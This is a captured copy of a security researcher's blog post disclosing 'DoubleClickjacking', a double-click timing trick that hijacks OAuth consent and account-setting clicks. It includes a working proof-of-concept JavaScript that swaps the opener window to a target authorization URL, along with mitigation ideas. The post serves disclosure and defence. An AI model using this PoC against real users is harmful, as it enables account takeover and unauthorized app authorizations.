<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://www.paulosyibelo.com/2024/12/doubleclickjacking-what.html">Original</a>
    <h1>A New type of web hacking technique: DoubleClickjacking</h1>
    
    <div id="readability-page-1" class="page"><div>
<p> 
<span>
    <span><b>“Clickjacking”</b> is becoming less practical as modern browsers set all cookies to “SameSite: Lax” by default. Even if an attacker site can frame another website, the framed site would be unauthenticated, because cross-site cookies are not sent. This significantly reduces the risk of successful clickjacking attacks, as most interesting functionality on websites typically requires authentication. </span>
</span>
</p><p>
    <span><b>DoubleClickjacking</b> is a new variation on this classic theme: instead of relying on a single click, it takes advantage of a double-click sequence. While it might sound like a small change, it opens the door to new UI manipulation attacks that bypass all known clickjacking protections, including the X-Frame-Options header, CSP&#39;s frame-ancestors and SameSite: Lax/Strict cookies. This technique seemingly affects almost every website, leading to account takeovers on many major platforms.</span>
</p>



<p><b><span>Root Cause</span></b></p><p><span><p>DoubleClickjacking exploits a timing and event-order quirk:</p></span></p><ol><li><span><span></span><span>The attacker creates an initial webpage with a button that opens a new window (or just opens a new window without user interaction).</span></span></li><li><span><span></span><span>When the user clicks this button:</span></span></li><ul><li><span><span></span><span>A new window opens on top, asking the user to “double-click.”</span></span></li><li><span><span></span><span>This new window immediately uses </span><span>window.opener.location</span><span> to change the parent window’s location to the target page.</span></span></li><li><span><span></span><span>The parent window now contains the target page (e.g., OAuth authorization), while the top window still shows the double-click prompt.</span></span></li></ul><li><span><span></span><span>When the user attempts the requested double-click:</span></span></li></ol><ol><ul><li><span><span></span><span>The first click (triggered on </span><span>mousedown</span><span>) causes the top window to close.</span></span></li><li><span><span></span><span>The second click lands on the now-exposed authorization button in the parent window.</span></span></li><li><span><span></span><span>The user unknowingly authorizes the attacker’s application into their account with arbitrary scope.</span><p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEguGmhrd0CL2DZf_1AUpRuyxGq2u-4iThnd64mHOgFe6cLMpRE3UzL8qW8dkb4wgfIgVcPGbisBWuqM8WzU7kSdYdyTTq4vTx2SiH3hO-RgUeSvRENFBMB3CzcFBhfOqha17Ona4gnLcbD4KsE2Wyy0_YfbG8Af6iYnIphO_4le7BrYgwzvgKVEXT8FGzzy/s2530/Screenshot%202024-12-30%20at%208.53.06%E2%80%AFPM.png"><img data-original-height="1516" data-original-width="2530" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEguGmhrd0CL2DZf_1AUpRuyxGq2u-4iThnd64mHOgFe6cLMpRE3UzL8qW8dkb4wgfIgVcPGbisBWuqM8WzU7kSdYdyTTq4vTx2SiH3hO-RgUeSvRENFBMB3CzcFBhfOqha17Ona4gnLcbD4KsE2Wyy0_YfbG8Af6iYnIphO_4le7BrYgwzvgKVEXT8FGzzy/s16000/Screenshot%202024-12-30%20at%208.53.06%E2%80%AFPM.png"/></a></p></span></li></ul></ol><p><span>In simpler terms, DoubleClickjacking leverages the small gap between the <b>start</b> of a click and the <b>end</b> of the second click in multiple windows without utilizing any popunder tricks. It is a sleight of hand. Attackers load (or open) a new window for a legitimate seeming reason—like a “captcha verification,” for example. Then, just before the second click is pressed, the malicious site can quickly swap in a more sensitive window from the same browser session (e.g., an OAuth authorization prompt), effectively hijacking that second click. There are many ways to perform the “swap,” the most reliable and smooth method I found uses <span>window.open.location</span>. </span></p><p><b><span>How It Can Be Exploited</span></b></p><ul><li><span><b></b><span><b>OAuth &amp; API Permissions</b>: Attackers could trick targets into authorizing a malicious application with extensive privileges. This technique has unfortunately led to account takeovers in almost every site that supports OAuth - which is pretty much all major websites with an API support.  And even if by some miracle it is detected and the user tries to revoke the a malicious attacker app, it would already be too late since it could perform its malicious actions the instant it is authorized.</span></span></li><li><span><b></b><span><b>One-Click Account Changes</b>: Similar to classic clickjacking, DoubleClickjacking can be used to make the user click on account-setting changes, such as disabling security settings, deleting an account, authorizing access or money transfers, or confirming transactions, etc.</span></span></li></ul><h3>Proof of Concept (PoC) Code</h3><p>Below is a code snippet that can be used to create a PoC for this vulnerability class:</p><p><code>
&lt;script&gt;
function openDoubleWindow(url, top, left, width, height) {
    var evilWindow = window.open(window.location.protocol+&#34;//&#34;+
  		window.location.hostname+&#34;:&#34;+
  		window.location.port+&#34;/random&#34;, 
  	&#34;_blank&#34;);

    evilWindow.onload = function() {
        evilWindow.document.open();

        //plugs the page to be hijacked as opener returnee
        evilWindow.document.write(`
            &lt;script&gt;
            setTimeout(function() { 
                opener.location = &#34;${url}&#34;; 
            }, 1000);

            &lt;/scri`+`pt&gt;
            
            &lt;div id=&#34;doubleclick&#34; type=&#34;button&#34; class=&#34;button&#34; 
                style=&#34;top: ${top}px; left: ${left}px; width: ${width}px; height: ${height}px; position: absolute; font-size: 16px; color: white; background-color: #3498db; box-shadow: 5px 5px 10px rgba(0, 0, 0, 0.3); display: flex; justify-content: center; align-items: center; font-weight: bold; text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.3); cursor: pointer; border-radius: 20px; text-align: center; padding: 0 5px; transition: all 0.3s ease;&#34; onmouseover=&#34;this.style.backgroundColor=&#39;#2980b9&#39;; this.style.boxShadow=&#39;6px 6px 12px rgba(0, 0, 0, 0.4)&#39;; this.style.transform=&#39;scale(1.05)&#39;;&#34; 
                onmouseout=&#34;this.style.backgroundColor=&#39;#3498db&#39;; this.style.boxShadow=&#39;5px 5px 10px rgba(0, 0, 0, 0.3)&#39;; this.style.transform=&#39;scale(1)&#39;;&#34;&gt;Double Click Here&lt;/div&gt;
&lt;script&gt;
      document.getElementById(&#39;doubleclick&#39;).addEventListener(&#39;mousedown&#39;, function() {
       window.close();
       });
       &lt;/scr`+`ipt&gt;`);
        
        evilWindow.document.close();
    };
}
&lt;/script&gt;

&lt;!-- Replace value&#39;s below with the URL and top, left, width, height of a button you want to doublejack with --&gt;

&lt;button onclick=&#34;openDoubleWindow(&#39;https://target.com/oauth2/authorize?client_id=attacker&#39;,647, 588.5, 260, 43)&#34;&gt;Start Demo&lt;/button&gt;
<br/></code></p>
  
  
  
  
  
  
  
  <div><h4><span><b>How it Looks</b></span></h4><p><span><b>Example: Salesforce Account Takeover</b></span></p></div><p><span><b>Why It’s Dangerous</b></span></p><div><ul><li><span><span><b>Bypass of Clickjacking Protections</b>: Most webapps and frameworks assume that only a single forced click is a risk. DoubleClickjacking adds a layer many defenses were never designed to handle. methods like X-Frame-Options, SameSite cookies, or CSP cannot defend against this attack.</span></span></li><li><span><span><b>Not Just Websites: </b>This technique can be used to attack not only websites but browser extensions as well. For example, I have made proof of concepts to top browser crypto wallets that uses this technique to authorize web3 transactions &amp; dApps or disabling VPN to expose IP etc. This can also be done in mobile phones by asking target to &#34;DoubleTap&#34;.</span></span></li><li><span><b></b><span><b>New Attack Surface</b>: This creates new attack opportunities for web attacks. A double-click on an attacker’s website can now lead to serious consequences in multiple platforms.</span></span></li><li><span><span><b>Extremely Rampant:</b> Based on my tests, all websites by default (those that didn&#39;t fix this yet) are vulnerable to this many surprising impacts including oauth takeovers etc. I&#39;ve reported this issue to some sites, the results have been mixed. Most have chosen to address it  while some have chosen not to.</span></span></li><li><span><span><b>Minimal User Interaction</b>: It only requires the target to double-click. They don’t need to fill out forms or perform crazy multiple steps (if the site can open windows or launched from site that can).</span></span></li></ul><p><span>P.S: Note that windows can be opened on top of the whole browser (instead of as a tab), hiding the fact that the opener has changed location (and all tabs)</span></p><p><b><span>Mitigation Ideas</span></b></p><ol><li><p><b><span>Client-Side Protection</span></b></p><p><span><span>The following JavaScript based approach can eliminate the risk of DoubleClickjacking by disabling critical buttons by default unless a gesture is detected (e.g., moving the mouse or using the keyboard). it is simple and very effective:</span></span></p><span><span></span></span></li></ol><p><span><span>Using it is super simple. just &lt;script src=doubleclickjackingprotection.js&gt;&lt;/script&gt; on your sensitive pages and you are done.</span></span></p><ol><ul><li><span><span><b></b></span><span>All submit/buttons on a page are initially disabled.</span></span></li><li><span><span><b></b></span><span>A user must demonstrate real, intentional interaction—through a gesture (mouse movements or keyboard interaction like pressing Tab—before these buttons become activated.</span></span></li><li><span><span><b></b></span><span>This thwarts attacks that rely on purely simulated or tricked interactions, since the user’s second click can no longer automatically fire on a hidden action.</span></span></li><li><span><span><b></b></span><span>It has no noticeable impact on user experience. From the user’s perspective, everything should work as intended without any changes. An examples of popular sites that uses a similar script to mitigate the vulnerability class are DropBox, Stripe and GitHub. This is how the attack looks on their websites. </span><iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="" frameborder="0" height="315" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/20XOSFTp7dQ?si=OElXe-5zZhXIZEsR" title="YouTube video player" width="560"></iframe></span></li></ul></ol><ol><li><p><b><span>Long-Term Browser Solutions</span></b></p><p><span><span>In the long run, browsers should adopt new standards to defend against double-click exploitation—similar to how </span><span>X-Frame-Options</span><span> or </span><span>frame-ancestors</span><span> protect against classic iframe-based clickjacking. When clickjacking was first discovered in 2008, the initial mitigation was also JavaScript until browsers provided a simpler method to mitigate the vulnerability class. One example approach could be a special HTTP header, for instance:</span></span></p><span><span></span></span></li></ol><ol><ul><li><p><b><span>Implement the Protective Library on Sensitive Pages</span></b></p><span><p><span>Any page handling OAuth scope verification, payment confirmations, or other high-privilege actions should include the defensive script until browsers provide solutions.</span></p></span></li></ul></ol><p><b><span>Conclusion</span></b></p><p><span><p>DoubleClickjacking is a sleight of hand around on a well-known attack class. By exploiting the event timing between clicks, attackers can seamlessly swap out benign UI elements for sensitive ones in the blink of an eye.  </p></span></p><p><span>Until next time, good luck!</span></p>
</div>
</div></div>
  </body>
</html>
